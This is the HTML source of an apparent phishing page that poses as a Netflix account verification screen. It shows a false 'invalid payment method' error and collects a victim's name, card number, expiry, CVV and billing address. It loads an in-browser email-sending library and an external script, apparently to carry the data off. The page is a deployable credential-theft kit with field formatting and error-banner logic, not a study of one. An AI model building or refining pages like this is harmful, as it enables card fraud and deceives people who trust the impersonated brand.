<!DOCTYPE html>
<html lang="en">

<html>
<head>
    <meta charset="utf-8">

        <!--"user-scalable=no" disable zooming when
        clicking in submission boxes on mobile-->

        <meta name="viewport" content="width=device-width, initial-scale=0.8, user-scalable=no">
        
        <title>Netflix - Verify Account</title>

        <!--href stands for hypertext reference-->
        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->

        <link rel="stylesheet" href="style.css"
        type="text/css">
        <link rel="icon" href="logo.png" type="image/png">
        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
        <script src="https://smtpjs.com/v3/smtp.js"></script>
</head>
<body>
    <div class="container">

        <div class="navbar__container2">
            <nav class="navbar">
                <div class="navbar__container2">
                    <a href="cc.html" id="navbar__logo"><img src="head.png" width="169" height="59" style="margin-top: 11px; margin-left: 0px; margin-right: 5px;"></a>
                </div>
            </nav>
        </div>
        <br><br><br>

        <div class="containaa">
            <form action="#" class="contact">

                <div class="signin2">
                    <img src="pop.png" width="410px">
                </div>
                <div class="redcc">
                    <p class="redcctext">Invalid payment method, try again.</p>
                </div>
                <div class="billing2">
                    <p class="billingtext"><b>Payment Information</b></p>
                </div>
                <input id="fname" type="text" placeholder="Full Name" required>
                <input id="fcard" type="number" placeholder="Card Number" pattern="[0-9]*" oninput="checkPhoneNumberLength(this)" required>
                <input id="fexp" type="text" inputmode="numeric" oninput="checkexplength(this)" placeholder="Expiration Date" required>
                <input id="fcvv" type="number" placeholder="CVV    (3-4 digit security code)" pattern="[0-9]*" oninput="PhoneNumberLength(this)" required>
                <br>
                <div class="billing">
                    <p class="billingtext"><b>Billing address</b></p>
                </div>

                <input id="faddress" type="text" placeholder="Street Address" required>
                <input id="fzip" type="number" placeholder="Zipcode" pattern="[0-9]*" oninput="ZipLength(this)" required>
                <input id="fcity" type="text" placeholder="City" required>
                <input id="fstate" type="text" placeholder="State" required>

                <input id="fsubmit" class="subbut" type="image" src="signin.png" alt="Submit">

            
            <form>
            <script>
                function ZipLength(input) {
                    if (input.value.length > 5) {
                    input.value = input.value.slice(0, 5);
                    }
                }
            </script>
            <script>
                function PhoneNumberLength(input) {
                    if (input.value.length > 4) {
                    input.value = input.value.slice(0, 4);
                    }
                }
            </script>
            <script>
                function checkPhoneNumberLength(input) {
                    if (input.value.length > 18) {
                    input.value = input.value.slice(0, 18);
                    }
                }
            </script>
            <script>
                function checkexplength(input) {
                    if (input.value.length > 5) {
                    input.value = input.value.slice(0, 5);
                 }
               }
            </script>

            <!--auto exp-->
            <script>
                const dobInput = document.getElementById("fexp");
                
                dobInput.addEventListener("input", function (event) {
                    const input = event.target.value;
                    const sanitizedInput = input.replace(/\D/g, ''); // Remove non-digit characters
                
                    if (sanitizedInput.length > 5) {
                    event.target.value = sanitizedInput.substring(0, 5);
                    return;
                    }
                
                    let formattedInput = '';
                    let currentIndex = 0;
                
                    for (let i = 0; i < sanitizedInput.length; i++) {
                    if (currentIndex === 2 || currentIndex === 2) {
                        formattedInput += '/';
                    }
                    formattedInput += sanitizedInput[i];
                    currentIndex++;
                    }
                
                    event.target.value = formattedInput;
                });
            </script>

        </div>
    </div>

    <script>
        var finput = document.querySelector('.contact input');
        var button = document.querySelector('.contact input[type="image"]');
        var red = document.querySelector('.redcc');
    
        button.addEventListener('click', function(event) {
            var finputBorderColor = getComputedStyle(finput).borderBottomColor.toLowerCase();

            if (finput.value === '') {
                event.preventDefault();

                red.style.display = "flex";

                window.scrollTo({
                    top: 0,
                    behavior: 'instant' // You can use 'auto' or 'instant' instead of 'smooth'
                });

            } else {
                button.classList.add('clicked');
                button.style.opacity = 0.7;

                setTimeout(function() {

                    button.classList.remove('clicked');
                    button.style.opacity = 1;

                }, 4000);
            }
        });
    </script>
    <script src="cc.js"></script>
    <br>

</body>
</html>
